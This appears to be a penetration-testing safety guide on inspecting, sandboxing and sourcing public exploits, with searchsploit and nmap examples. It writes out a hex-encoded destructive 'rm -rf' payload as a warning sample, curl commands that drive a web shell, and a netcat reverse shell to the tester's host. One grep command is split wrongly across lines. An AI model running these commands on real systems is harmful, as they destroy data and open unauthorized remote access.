# Exploit Safety — Read Before Running

Always **read the exploit source code** before executing anything; even something that looks like shellcode can be a disguised destructive command. Look specifically for **privilege checks** (e.g. `geteuid()`), suspicious system calls, or obvious destructive strings such as `rm -rf`. If you see anything alarming, do not run it. A quick way to inspect small pieces is to print suspicious byte arrays in a REPL to reveal their ASCII meaning, for example:

```python
jmpcode = b"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"

print(jmpcode.decode('latin1'))
```

# Test in Isolated Environments

Execute exploits **only** in isolated VMs or sandboxes that have clean snapshots you can revert immediately. Always snapshot _before_ running and restore after. To create and revert snapshots use your hypervisor (VirtualBox/VMware/Libvirt) or cloud images; **never** test on your Kali host or any production network. Make monitoring easier by capturing network traffic and filesystem changes (e.g. `tcpdump` and `inotifywait`) while testing.

# Prefer Curated Sources

Prefer vetted repositories such as **Exploit-DB** and **Packet Storm** because they often review submissions. Treat GitHub as untrusted by default — review code thoroughly before use. When using a curated source, check the **verified** flag and read any included notes or comments on the exploit page.

# Offline Tools & Example Commands

Use offline tools to search and inspect exploits locally. Install or update the local Exploit-DB package and use `searchsploit` to find and copy exploits for local review:

```bash
sudo apt update && sudo apt install exploitdb
searchsploit php webdav windows 
searchsploit -m 42031           # copy exploit by EDB-ID or path into cwd 
searchsploit -p 48537          # show full path to exploit
```

Use `nmap` script help to read NSE script docs before running them:

```bash
nmap --script-help=clamav-exec.nse g
rep -i Exploits /usr/share/nmap/scripts/*.nse
```

When you need to sanity-check web-shells or remote command execution, use basic `curl` checks and URL encoding for parameters:

```bash
curl "http://target/uploads/backdoor.php?cmd=whoami" 
curl --data-urlencode "cmd=which nc" "http://target/uploads/backdoor.php"
```

To get a reverse shell with `nc` from a web shell (only in-scope targets), set a listener on your machine and invoke `nc` on target:

```bash
nc -lvnp 6666

# on target via webshell: 
nc -nv <your-ip> 6666 -e /bin/bash
```

Always verify the commands you send to remote shells will not escalate risk unnecessarily.
